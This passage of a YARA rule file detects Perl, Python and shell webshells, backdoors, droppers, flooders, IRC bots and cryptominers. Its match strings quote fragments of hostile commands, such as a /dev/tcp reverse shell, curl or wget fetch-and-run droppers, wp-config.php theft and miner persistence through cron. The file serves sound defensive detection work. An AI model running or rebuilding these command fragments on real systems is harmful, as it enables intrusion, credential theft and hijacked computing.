    strings:
        $ps0 = "<title>GO.cgi</title>"
    condition:
        $ps0
}

rule pl_backdoor_webshell_008 : backdoor
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06895
}

private rule PR06896 : trigger
{
    strings:
        $ps0 = "print \"\\tcompleted"
    condition:
        $ps0
}

private rule PR06897 : trigger
{
    strings:
        $ps0 = "uid=0(root) gid=0(root) groups=0(root)"
    condition:
        $ps0
}

rule pl_backdoor_webshell_009 : backdoor
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06896 and PR06897
}

private rule PR06898 : trigger
{
    strings:
        $ps0 = "admin\\@$ServerName"
    condition:
        $ps0
}

private rule PR06899 : trigger
{
    strings:
        $ps0 = "decode_base64"
    condition:
        $ps0
}

rule pl_backdoor_webshell_010 : backdoor
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06898 and PR06899
}

rule pl_backdoor_webshell_011 : backdoor
{
    strings:
        $trigger = "eval \"$k=\\\"`cgi_decodevar \\\"$v\\\"`\\\"\""
    condition:
        $trigger and PR00507 and PR01819
}

private rule PR06900 : trigger
{
    strings:
        $ps0 = "} else { syswrite($client, \"\\x05\\xFF\", 2); };"
    condition:
        $ps0
}

rule pl_backdoor_webshell_gen_002 : backdoor
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06900
}

rule pl_exploit_autoroot_001 : exploit
{
    strings:
        $trigger = "print \"# Auto Rooting"
    condition:
        $trigger and PR06884
}

rule pl_hacktool_bruteforce_001 : hacktool
{
    strings:
        $trigger = "FBF - FTP Brute Forcer"
    condition:
        $trigger
}

private rule PR06901 : trigger
{
    strings:
        $ps0 = "eval unpack u=>q{_\"G5S92!'971O<"
    condition:
        $ps0
}

rule pl_hacktool_bruteforce_002 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06901
}

private rule PR06902 : trigger
{
    strings:
        $ps0 = "wordpress_logged_in"
    condition:
        $ps0
}

private rule PR06903 : trigger
{
    strings:
        $ps0 = "HTTP::Request->new(POST"
    condition:
        $ps0
}

rule pl_hacktool_bruteforce_002_02 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06902 and PR06903
}

private rule PR06904 : trigger
{
    strings:
        $ps0 = "print \"Scanning: \".$a.\".0.0.0/8\";"
    condition:
        $ps0
}

rule pl_hacktool_bruteforce_003 : hacktool
{
    strings:
        $trigger = "/bin/"
    condition:
        $trigger and PR06904
}

private rule PR06905 : trigger
{
    strings:
        $ps0 = "QnJ1d"
    condition:
        $ps0
}

rule pl_hacktool_bruteforce_004 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06905 and PR06899
}

private rule PR06906 : trigger
{
    strings:
        $ps0 = "?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folde"
    condition:
        $ps0
}

rule pl_hacktool_com_mediaexploit_001 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06906
}

private rule PR06907 : trigger
{
    strings:
        $ps0 = "$kola=$msr.\"/\".$user;"
    condition:
        $ps0
}

rule pl_hacktool_configuration_stealer_001 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06907
}

private rule PR06908 : trigger
{
    strings:
        $ps0 = "confspy.pl"
    condition:
        $ps0
}

rule pl_hacktool_configuration_stealer_002 : hacktool
{
    strings:
        $trigger = "config"
    condition:
        $trigger and PR06908
}

private rule PR06909 : trigger
{
    strings:
        $ps0 = ".'/httpdocs/wp-config.php',$"
    condition:
        $ps0
}

rule pl_hacktool_configuration_stealer_003 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06909
}

private rule PR06910 : trigger
{
    strings:
        $ps0 = "echo -e '\"uname\":[\"'$(uname -a"
    condition:
        $ps0
}

private rule PR06911 : trigger
{
    strings:
        $ps0 = "NAMED_CONF=\"/etc/named.conf\""
    condition:
        $ps0
}

rule pl_hacktool_configuration_stealer_004 : hacktool
{
    strings:
        $trigger = "/bin/sh"
    condition:
        $trigger and PR06910 and PR06911
}

private rule PR06912 : trigger
{
    strings:
        $ps0 = "Cpanel Password Brute Forcer"
    condition:
        $ps0
}

rule pl_hacktool_cpanel_attack_001 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06912
}

rule pl_hacktool_ddosperlircbot_001 : hacktool
{
    strings:
        $trigger = "sendraw($IRC_cur_socket, \"PRIVMSG $printl"
    condition:
        $trigger and PR00013
}

private rule PR06913 : trigger
{
    strings:
        $ps0 = "eval(decode_base64('IyEvdXNyL2Jpbi9wZXJs"
    condition:
        $ps0
}

rule pl_hacktool_ddosperlircbot_001_02 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06913
}

rule pl_hacktool_defacer_script_001 : hacktool
{
    strings:
        $trigger = "$dirok=\"\\e[33m[+]\\e[m Ok, Diretory that wanna be Massdeface"
    condition:
        $trigger and PR01848
}

private rule PR06914 : trigger
{
    strings:
        $ps0 = "print \"\\n\\n\\t.::. Exploit for JCE Joomla Extension"
    condition:
        $ps0
}

rule pl_hacktool_exploit_001 : hacktool
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR06914
}

private rule PR06915 : trigger
{
    strings:
        $ps0 = "if ( print $sock $primarypayload ) {"
    condition:
        $ps0
}

rule pl_hacktool_flooder_002 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06915
}

private rule PR06916 : trigger
{
    strings:
        $ps0 = "socket(crazy, PF_INET, SOCK_DGRAM, 17)"
    condition:
        $ps0
}

private rule PR06917 : trigger
{
    strings:
        $ps0 = "randpackets:"
    condition:
        $ps0
}

rule pl_hacktool_flooder_003 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06916 and PR06917
}

private rule PR06918 : trigger
{
    strings:
        $ps0 = "send(flood, pack(\"a$psize\",\""
    condition:
        $ps0
}

rule pl_hacktool_flooder_004 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06918
}

private rule PR06919 : trigger
{
    strings:
        $ps0 = "Created By arage"
    condition:
        $ps0
}

rule pl_hacktool_flooder_005 : hacktool
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR06919
}

rule pl_hacktool_information_gathering_001 : hacktool
{
    strings:
        $trigger = "open (d0mains, '/etc/named.conf')"
    condition:
        $trigger
}

private rule PR06920 : trigger
{
    strings:
        $ps0 = "my $glink = (\"www.google.co.uk/search?q=\".&key($dork"
    condition:
        $ps0
}

rule pl_hacktool_information_gathering_002 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06920
}

private rule PR06921 : trigger
{
    strings:
        $ps0 = "print \"\\n\\n WORDPRESS BRUTE"
    condition:
        $ps0
}

rule pl_hacktool_information_gathering_003 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06921
}

rule pl_hacktool_ircbot_001 : hacktool
{
    strings:
        $trigger = "[Attack BOT]"
    condition:
        $trigger and PR00013
}

rule pl_hacktool_ircbot_002 : hacktool
{
    strings:
        $trigger = "my $cmd=\"[PHP-SHELL]\";"
    condition:
        $trigger and PR00013
}

private rule PR06922 : trigger
{
    strings:
        $ps0 = "\"JGM9Z3ppbmZsYXRlKHN0cl9yb3QxMyhiYXNlNjRfZGVjb2RlKCJyVWw2UXVOVEVQNWNKUDdE"
    condition:
        $ps0
}

rule pl_hacktool_ircbot_004 : hacktool
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR06922
}

private rule PR06923 : trigger
{
    strings:
        $ps0 = "unless ($natrix eq \"!bot\" and $arg =~ /^\\!nick"
    condition:
        $ps0
}

rule pl_hacktool_ircbot_005 : hacktool
{
    strings:
        $trigger = "/etc/"
    condition:
        $trigger and PR06923
}

private rule PR06924 : trigger
{
    strings:
        $ps0 = "!bot @milw0rm"
    condition:
        $ps0
}

rule pl_hacktool_ircbot_006 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06924
}

private rule PR06925 : trigger
{
    strings:
        $ps0 = "if ($^O eq \"MSWin32\") { $ewblock = 10035; $eiprogr = 10036;"
    condition:
        $ps0
}

private rule PR06926 : trigger
{
    strings:
        $ps0 = "my $sender = @{$b->{from}}[int rand scalar @{$b"
    condition:
        $ps0
}

rule pl_hacktool_mumblehard_spammer_001 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06925 and PR06926
}

private rule PR06927 : trigger
{
    strings:
        $ps0 = "print $fileHandle \"AddHandler txt .php\\n\";"
    condition:
        $ps0
}

rule pl_hacktool_symlink_001 : hacktool
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR06927
}

private rule PR06928 : trigger
{
    strings:
        $ps0 = "eval eval '\"'."
    condition:
        $ps0
}

rule pl_hacktool_symlink_002 : hacktool
{
    strings:
        $trigger = "!/usr/bin/perl"
    condition:
        $trigger and PR06928
}

private rule PR06929 : trigger
{
    strings:
        $ps0 = "w3tw0rk B0T"
    condition:
        $ps0
}

rule pl_hacktool_w3tw0rk_B0T_001 : hacktool
{
    strings:
        $trigger = "/etc/"
    condition:
        $trigger and PR06929
}

rule py_backdoor_ChickenLittleshell_001 : backdoor
{
    strings:
        $trigger = "(.)(.) [ChickenLittle Shell by Zep] (.)(.)"
    condition:
        $trigger and PR02440 and PR00026
}

private rule PR06930 : trigger
{
    strings:
        $ps0 = "print \"ython connect-back door\""
    condition:
        $ps0
}

rule py_backdoor_connect_back_001 : backdoor
{
    strings:
        $trigger = "shell"
    condition:
        $trigger and PR02440 and PR06930
}

private rule PR06931 : trigger
{
    strings:
        $ps0 = "sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
    condition:
        $ps0
}

rule py_backdoor_connect_back_002 : backdoor
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR06931
}

private rule PR06932 : trigger
{
    strings:
        $ps0 = "$cp = <SOCK>; $cp =~ s/\\n//; $cp =~ s/\\r//;"
    condition:
        $ps0
}

rule py_backdoor_connect_back_003 : backdoor
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR06932
}

rule py_backdoor_dropper_001 : backdoor
{
    strings:
        $trigger = "&name=r0ot.py"
    condition:
        $trigger and PR02440
}

rule py_backdoor_generic_001 : backdoor
{
    strings:
        $trigger = "ython connect-back door\""
    condition:
        $trigger and PR02440 and PR00026
}

rule py_backdoor_joomra_001 : backdoor
{
    strings:
        $trigger = "clear = \"\\x1b[0m\""
    condition:
        $trigger and PR02440 and PR00026
}

private rule PR06933 : trigger
{
    strings:
        $ps0 = "char payload["
    condition:
        $ps0
}

rule py_backdoor_shell_002 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR06933
}

rule py_backdoor_webshell_001 : backdoor
{
    strings:
        $trigger = "payload = \"\"\"perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET"
    condition:
        $trigger and PR02440
}

private rule PR06934 : trigger
{
    strings:
        $ps0 = "blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg;wget {shelltxt}"
    condition:
        $ps0
}

rule py_backdoor_webshell_002 : backdoor
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR06934
}

private rule PR06935 : trigger
{
    strings:
        $ps0 = "return ''.join([chr(ord(c) ^"
    condition:
        $ps0
}

rule py_backdoor_webshell_003 : backdoor
{
    strings:
        $trigger = "= \".\".join(map(str,"
    condition:
        $trigger and PR00029 and PR00634 and PR06935
}

rule py_backdoor_webshell_004 : backdoor
{
    strings:
        $trigger = "for user in `printf \"%s\\n\" \"$lse_shell_users\" | cut"
    condition:
        $trigger and PR00029 and PR00634
}

private rule PR06936 : trigger
{
    strings:
        $ps0 = "($unix)?('echo \"`uname -a`\";echo \"`id`\";/bin/sh'):('cmd.exe');"
    condition:
        $ps0
}

rule py_backdoor_webshell_005 : backdoor
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR06936
}

rule py_backdoor_webshell_006 : backdoor
{
    strings:
        $trigger = "eval(compile(zlib.decompress(base64.b64decode("
    condition:
        $trigger and PR02440
}

private rule PR06937 : trigger
{
    strings:
        $ps0 = "\"/admin/\", login_form_data).read()"
    condition:
        $ps0
}

rule py_hacktool_bruteforce_001 : hacktool
{
    strings:
        $trigger = "urllib.urlencode(login_form_seq)"
    condition:
        $trigger and PR06937
}

rule py_hacktool_bruteforce_002 : hacktool
{
    strings:
        $trigger = "glob.adminka_ip = adminka_list[int(time.time()) % len(adminka_list)]"
    condition:
        $trigger and PR00435
}

private rule PR06938 : trigger
{
    strings:
        $ps0 = "import socks"
    condition:
        $ps0
}

private rule PR06939 : trigger
{
    strings:
        $ps0 = "googlebot.com"
    condition:
        $ps0
}

private rule PR06940 : trigger
{
    strings:
        $ps0 = "self.tor = tor"
    condition:
        $ps0
}

rule py_hacktool_ddos_001 : hacktool
{
    strings:
        $trigger = "pack("
    condition:
        $trigger and PR06938 and PR06939 and PR06940
}

rule py_hacktool_ddos_002 : hacktool
{
    strings:
        $trigger = "Private DDoS Tool"
    condition:
        $trigger and PR02440
}

rule py_hacktool_ddos_003 : hacktool
{
    strings:
        $trigger = "open('xmlrpc_list.txt'"
    condition:
        $trigger and PR02440
}

private rule PR06941 : trigger
{
    strings:
        $ps0 = "GoldenEye(object)"
    condition:
        $ps0
}

rule py_hacktool_ddos_004 : hacktool
{
    strings:
        $trigger = "import http.client"
    condition:
        $trigger and PR02440 and PR06941
}

rule py_hacktool_ddos_005 : hacktool
{
    strings:
        $trigger = "./torshammer.py"
    condition:
        $trigger and PR02440
}

rule py_hacktool_drupal_exploit_001 : hacktool
{
    strings:
        $trigger = "target + \"?q=user/password&\" + payload"
    condition:
        $trigger and PR01848
}

rule py_hacktool_drupal_toolkit_001 : hacktool
{
    strings:
        $trigger = "} Drupal Mass Exploiter"
    condition:
        $trigger and PR03871
}

rule py_hacktool_exploit_002 : hacktool
{
    strings:
        $trigger = "data={\"___directive\": \"e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvc"
    condition:
        $trigger and PR01848
}

private rule PR06942 : trigger
{
    strings:
        $ps0 = "$exploits{$key}{alt};"
    condition:
        $ps0
}

rule py_hacktool_exploit_003 : hacktool
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR06942
}

private rule PR06943 : trigger
{
    strings:
        $ps0 = "generate_payload"
    condition:
        $ps0
}

private rule PR06944 : trigger
{
    strings:
        $ps0 = "JDatabaseDriver"
    condition:
        $ps0
}

rule py_hacktool_joomla_rce_exploit_001 : hacktool
{
    strings:
        $trigger = "eval("
    condition:
        $trigger and PR00026 and PR02440 and PR06943 and PR00634 and PR06944
}

private rule PR06945 : trigger
{
    strings:
        $ps0 = "secr7 = re.search (r\"(mosConfig_password = ')"
    condition:
        $ps0
}

rule py_hacktool_password_retriever_001 : hacktool
{
    strings:
        $trigger = "urllib"
    condition:
        $trigger and PR02440 and PR06945
}

private rule PR06946 : trigger
{
    strings:
        $ps0 = "= open( 'pwned.log', 'a' )"
    condition:
        $ps0
}

rule py_hacktool_password_retriever_002 : hacktool
{
    strings:
        $trigger = "print \"User:\",users,\"Password:\",words"
    condition:
        $trigger and PR06946 and PR05628
}

rule py_hacktool_symlink_001 : hacktool
{
    strings:
        $trigger = "eval(compile(zlib.decompress(base64.b64decode(\"eJydWG1v2zYQ"
    condition:
        $trigger
}

rule py_hacktool_symlink_001_02 : hacktool
{
    strings:
        $trigger = "use MIME::Base64;use Compress::Zlib;eval(Compress::Zlib::memGunzip(decode_base64(\"H4sIAAAAAAAA"
    condition:
        $trigger
}

rule py_hacktool_webshell_001 : hacktool
{
    strings:
        $trigger = "version = \"0.1 [py]\""
    condition:
        $trigger and PR02440
}

private rule PR06947 : trigger
{
    strings:
        $ps0 = "CGI"
    condition:
        $ps0
}

rule py_hacktool_webshell_002 : hacktool
{
    strings:
        $trigger = ">Welcome to cgi-shell.py"
    condition:
        $trigger and PR06947
}

private rule PR06948 : trigger
{
    strings:
        $ps0 = "/bin/"
    condition:
        $ps0
}

rule py_hacktool_webshell_003 : hacktool
{
    strings:
        $trigger = "child_stdin, child_stdout = os.popen2(base64.b64decode(cmd))"
    condition:
        $trigger and PR06948
}

rule py_hacktool_webshell_004 : hacktool
{
    strings:
        $trigger = "query=$(echo $cmd | base64 --decode)"
    condition:
        $trigger and PR06948
}

private rule PR06949 : trigger
{
    strings:
        $ps0 = "print exploit("
    condition:
        $ps0
}

private rule PR06950 : trigger
{
    strings:
        $ps0 = "tbladmins"
    condition:
        $ps0
}

rule py_hacktool_WHMCS_exploit_001 : hacktool
{
    strings:
        $trigger = "urllib"
    condition:
        $trigger and PR02440 and PR06949 and PR06950
}

private rule PR06951 : trigger
{
    strings:
        $ps0 = "if html == \"XML-RPC server accepts POST requests only.\":"
    condition:
        $ps0
}

rule py_hacktool_WP_xmlrpc_001 : hacktool
{
    strings:
        $trigger = "/bin/"
    condition:
        $trigger and PR06951
}

private rule PR06952 : trigger
{
    strings:
        $ps0 = "{hashlib.md5(u.netloc).hexdigest():hashlib.md5(shell_pass).hexdigest()}"
    condition:
        $ps0
}

rule py_hacktool_WSO_001 : hacktool
{
    strings:
        $trigger = "/bin/"
    condition:
        $trigger and PR06952
}

private rule PR06953 : trigger
{
    strings:
        $ps0 = "= 'fpm-worker-main'"
    condition:
        $ps0
}

rule py_malware_cryptominer_001 : malware
{
    strings:
        $trigger = "/bin/"
    condition:
        $trigger and PR06953
}

rule py_malware_injector_001 : malware
{
    strings:
        $trigger = "writer.write(base64.b64decode("
    condition:
        $trigger and PR02440
}

private rule PR06954 : trigger
{
    strings:
        $ps0 = "SELF_PATH = os.path.abspath(__file__)"
    condition:
        $ps0
}

private rule PR06955 : trigger
{
    strings:
        $ps0 = "write(base64.b64decode("
    condition:
        $ps0
}

rule py_malware_injector_002 : malware
{
    strings:
        $trigger = "injfs = ['"
    condition:
        $trigger and PR00732 and PR06954 and PR01746 and PR06955
}

private rule PR06956 : trigger
{
    strings:
        $ps0 = "import urllib"
    condition:
        $ps0
}

rule py_malware_injector_003 : malware
{
    strings:
        $trigger = "return zlib . decompress ( base64 . b64decode ("
    condition:
        $trigger and PR06956 and PR01396
}

rule py_malware_symlink_001 : malware
{
    strings:
        $trigger = "eval(compile(zlib.decompress(base64.b64decode(\"eJydWN1z4jgSfzZ/hdZTWcOG2JC6vQdC2MrNTO6m"
    condition:
        $trigger and PR02440
}

private rule PR06957 : trigger
{
    strings:
        $ps0 = "shell;curl -o /tmp/shell http"
    condition:
        $ps0
}

rule sh_backdoor_dropper_001 : backdoor
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR06957
}

private rule PR06958 : trigger
{
    strings:
        $ps0 = "$(echo -n \"curl=$Ecurl|wget=$Ewget|python=$Epy|perl=$Eperl|dir=$DIR\" | base64)"
    condition:
        $ps0
}

rule sh_backdoor_dropper_002 : backdoor
{
    strings:
        $trigger = "urllib"
    condition:
        $trigger and PR06958
}

private rule PR06959 : trigger
{
    strings:
        $ps0 = "/usr/bin/curl --connect-timeout 5 -m 5"
    condition:
        $ps0
}

rule sh_backdoor_dropper_003 : backdoor
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR06959
}

private rule PR06960 : trigger
{
    strings:
        $ps0 = "cmd=\"/usr/bin/curl -o/tmp/rce $rev_host"
    condition:
        $ps0
}

rule sh_backdoor_dropper_004 : backdoor
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR06960
}

private rule PR06961 : trigger
{
    strings:
        $ps0 = ";wget -q -O wp-index"
    condition:
        $ps0
}

rule sh_backdoor_dropper_005 : backdoor
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR06961
}

rule sh_backdoor_linuxrootkit_001 : backdoor
{
    strings:
        $trigger = "if [ -f './libworker.so' ];then killall -9 host;export AU="
    condition:
        $trigger and PR01746
}

private rule PR06962 : trigger
{
    strings:
        $ps0 = "perl nd.pl $1 $mad"
    condition:
        $ps0
}

rule sh_backdoor_linuxrootkit_002 : backdoor
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR06962
}

private rule PR06963 : trigger
{
    strings:
        $ps0 = "./esc ft* $rand"
    condition:
        $ps0
}

rule sh_backdoor_linuxrootkit_003 : backdoor
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR06963
}

private rule PR06964 : trigger
{
    strings:
        $ps0 = "wget http"
    condition:
        $ps0
}

private rule PR06965 : trigger
{
    strings:
        $ps0 = "/bin/bash"
    condition:
        $ps0
}

rule sh_backdoor_linuxrootkit_004 : backdoor
{
    strings:
        $trigger = "ssh root"
    condition:
        $trigger and PR06964 and PR06965
}

private rule PR06966 : trigger
{
    strings:
        $ps0 = "/doc;chmod +x /tmp/doc;perl /tmp/doc;"
    condition:
        $ps0
}

rule sh_backdoor_uploader_001 : backdoor
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR06966
}

private rule PR06967 : trigger
{
    strings:
        $ps0 = "rm -rf doc2*"
    condition:
        $ps0
}

rule sh_backdoor_uploader_002 : backdoor
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR06967
}

private rule PR06968 : trigger
{
    strings:
        $ps0 = "rm -rf /tmp/.a /tmp/start_"
    condition:
        $ps0
}

private rule PR06969 : trigger
{
    strings:
        $ps0 = ".js > /tmp/php-"
    condition:
        $ps0
}

rule sh_backdoor_uploader_003 : backdoor
{
    strings:
        $trigger = "checks=$(ps aux | grep php-"
    condition:
        $trigger and PR04286 and PR06968 and PR06969
}

private rule PR06970 : trigger
{
    strings:
        $ps0 = "curl -O http"
    condition:
        $ps0
}

private rule PR06971 : trigger
{
    strings:
        $ps0 = "chmod +x"
    condition:
        $ps0
}

private rule PR06972 : trigger
{
    strings:
        $ps0 = "perl"
    condition:
        $ps0
}

private rule PR06973 : trigger
{
    strings:
        $ps0 = "rm -rf"
    condition:
        $ps0
}

rule sh_backdoor_uploader_004 : backdoor
{
    strings:
        $trigger = "wget http"
    condition:
        $trigger and PR06965 and PR06970 and PR06971 and PR06972 and PR06973
}

rule sh_backdoor_uploader_005 : backdoor
{
    strings:
        $trigger = "if curl $1 > $2; then echo 'curl success'; else wget $1 -O $2; fi;"
    condition:
        $trigger and PR01848
}

private rule PR06974 : trigger
{
    strings:
        $ps0 = "cd /tmp;mkdir"
    condition:
        $ps0
}

rule sh_backdoor_uploader_006 : backdoor
{
    strings:
        $trigger = "> /dev/null 2>&1 & ';shell_exec($"
    condition:
        $trigger and PR06974
}

private rule PR06975 : trigger
{
    strings:
        $ps0 = "> /dev/null 2>&1 & echo $!';shell_exec($"
    condition:
        $ps0
}

rule sh_backdoor_uploader_007 : backdoor
{
    strings:
        $trigger = "cd /tmp;mkdir"
    condition:
        $trigger and PR06975
}

private rule PR06976 : trigger
{
    strings:
        $ps0 = ".css.txt' -O wpcss.php"
    condition:
        $ps0
}

rule sh_backdoor_uploader_008 : backdoor
{
    strings:
        $trigger = "/bin/sh"
    condition:
        $trigger and PR06976
}

rule sh_backdoor_uploader_009 : backdoor
{
    strings:
        $trigger = "/in; php asu.php < /dev/null"
    condition:
        $trigger and PR04286
}

private rule PR06977 : trigger
{
    strings:
        $ps0 = "/in -O x.php; php x.php"
    condition:
        $ps0
}

rule sh_backdoor_uploader_010 : backdoor
{
    strings:
        $trigger = "get"
    condition:
        $trigger and PR06977
}

private rule PR06978 : trigger
{
    strings:
        $ps0 = "/z0.txt | sh"
    condition:
        $ps0
}

rule sh_backdoor_uploader_011 : backdoor
{
    strings:
        $trigger = "/bin/sh"
    condition:
        $trigger and PR06978
}

private rule PR06979 : trigger
{
    strings:
        $ps0 = "-U \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0\" -O wp-theme-setting-v-"
    condition:
        $ps0
}

rule sh_backdoor_uploader_012 : backdoor
{
    strings:
        $trigger = "/bin/sh"
    condition:
        $trigger and PR06979
}

private rule PR06980 : trigger
{
    strings:
        $ps0 = "bash -i >& /dev/tcp/$"
    condition:
        $ps0
}

rule sh_backdoor_uploader_013 : backdoor
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR06980
}

private rule PR06981 : trigger
{
    strings:
        $ps0 = "EDT  + 10 seconds\"); chmod 0777 \"$"
    condition:
        $ps0
}

rule sh_backdoor_uploader_014 : backdoor
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR06981
}

rule sh_hacktool_abacusexploit_001 : hacktool
{
    strings:
        $trigger = "#define RUN_ROOTSHELL 0x5150"
    condition:
        $trigger and PR06965
}

private rule PR06982 : trigger
{
    strings:
        $ps0 = "for i in `pidof xmrigMiner`; do"
    condition:
        $ps0
}

rule sh_hacktool_cryptominer_tool_001 : hacktool
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR06982
}

private rule PR06983 : trigger
{
    strings:
        $ps0 = "-a xmr-v7 --host"
    condition:
        $ps0
}

rule sh_hacktool_cryptominer_tool_002 : hacktool
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR06983
}

private rule PR06984 : trigger
{
    strings:
        $ps0 = "mv -f exploit2.c exploit.c"
    condition:
        $ps0
}

rule sh_hacktool_exploit_001 : hacktool
{
    strings:
        $trigger = "/bin/sh"
    condition:
        $trigger and PR06984
}

private rule PR06985 : trigger
{
    strings:
        $ps0 = "u.username, u.hash, u.user_id,"
    condition:
        $ps0
}

rule sh_hacktool_exploit_002 : hacktool
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR06985
}

rule sh_hacktool_htaccesshack_001 : hacktool
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR00093
}

private rule PR06986 : trigger
{
    strings:
        $ps0 = "cat eml.txt | mail -s"
    condition:
        $ps0
}

rule sh_hacktool_mailer_001 : hacktool
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR06986
}

rule sh_hacktool_roguejs_001 : hacktool
{
    strings:
        $trigger = "node32linux > nodejs"
    condition:
        $trigger and PR01848
}

private rule PR06987 : trigger
{
    strings:
        $ps0 = "eval \"ln -s /home/$i/public_html/configuration.php ../sym/$i"
    condition:
        $ps0
}

rule sh_hacktool_symlink_001 : hacktool
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR06987
}

private rule PR06988 : trigger
{
    strings:
        $ps0 = "cp "
    condition:
        $ps0
}

private rule PR06989 : trigger
{
    strings:
        $ps0 = "/wp-config.php 13.txt;"
    condition:
        $ps0
}

rule sh_malware_component_001 : malware
{
    strings:
        $trigger = ".com"
    condition:
        $trigger and PR06988 and PR06989
}

rule sh_malware_component_001_02 : malware
{
    strings:
        $trigger = "cp wp-system.php /"
    condition:
        $trigger and PR06397
}

private rule PR06990 : trigger
{
    strings:
        $ps0 = "chmod 0777 links.sh;"
    condition:
        $ps0
}

rule sh_malware_component_001_03 : malware
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR06990
}

private rule PR06991 : trigger
{
    strings:
        $ps0 = "@fucksheep.org"
    condition:
        $ps0
}

rule sh_malware_component_002 : malware
{
    strings:
        $trigger = "*/"
    condition:
        $trigger and PR06991
}

private rule PR06992 : trigger
{
    strings:
        $ps0 = "nohup php -r 'ini_set(\"display_errors"
    condition:
        $ps0
}

private rule PR06993 : trigger
{
    strings:
        $ps0 = "killstr \"miner\""
    condition:
        $ps0
}

rule sh_malware_cryptominer_003 : malware
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR06992 and PR06993
}

private rule PR06994 : trigger
{
    strings:
        $ps0 = "cryptonight"
    condition:
        $ps0
}

private rule PR06995 : trigger
{
    strings:
        $ps0 = "crontab -l 2>/dev/null; echo \"* * * * *"
    condition:
        $ps0
}

rule sh_malware_cryptominer_004 : malware
{
    strings:
        $trigger = "/bin/sh"
    condition:
        $trigger and PR06994 and PR06995
}

private rule PR06996 : trigger
{
    strings:
        $ps0 = "--auto --any --forever --nicehash --variation ${FORK} --low -o ${POOL}:${PORT} -u ${WALLET}"
    condition:
        $ps0
}

rule sh_malware_cryptominer_005 : malware
{
    strings:
        $trigger = "/bin/"
    condition:
        $trigger and PR06996
}

private rule PR06997 : trigger
{
    strings:
        $ps0 = "./cpuminer-sse2 -a lyra2tdc -o stratum+tcps:"
    condition:
        $ps0
}

rule sh_malware_cryptominer_006 : malware
{
    strings:
        $trigger = "while [ 1 ]; do"
    condition:
        $trigger and PR06997
}

private rule PR06998 : trigger
{
    strings:
        $ps0 = "exec &>/dev/null"
    condition:
        $ps0
}

private rule PR06999 : trigger
{
    strings:
        $ps0 = "export PATH=$PATH"
    condition:
        $ps0
}

rule sh_malware_unix_cryptominer_001 : malware
{
    strings:
        $trigger = "d2web.org"
    condition:
        $trigger and PR06998 and PR06999
}

private rule PR07000 : trigger
{
    strings:
        $ps0 = "onion."
    condition:
        $ps0
}

rule sh_malware_unix_cryptominer_002 : malware
{
    strings:
        $trigger = "export PATH=$PATH"
    condition:
        $trigger and PR07000 and PR06998
}

private rule PR07001 : trigger
{
    strings:
        $ps0 = "darknet."
    condition:
        $ps0
}

rule sh_malware_unix_cryptominer_024 : malware
{
    strings:
        $trigger = "export PATH=$PATH"
    condition:
        $trigger and PR07001 and PR06998
}

private rule PR07002 : trigger
{
    strings:
        $ps0 = "tor2web."
    condition:
        $ps0
}

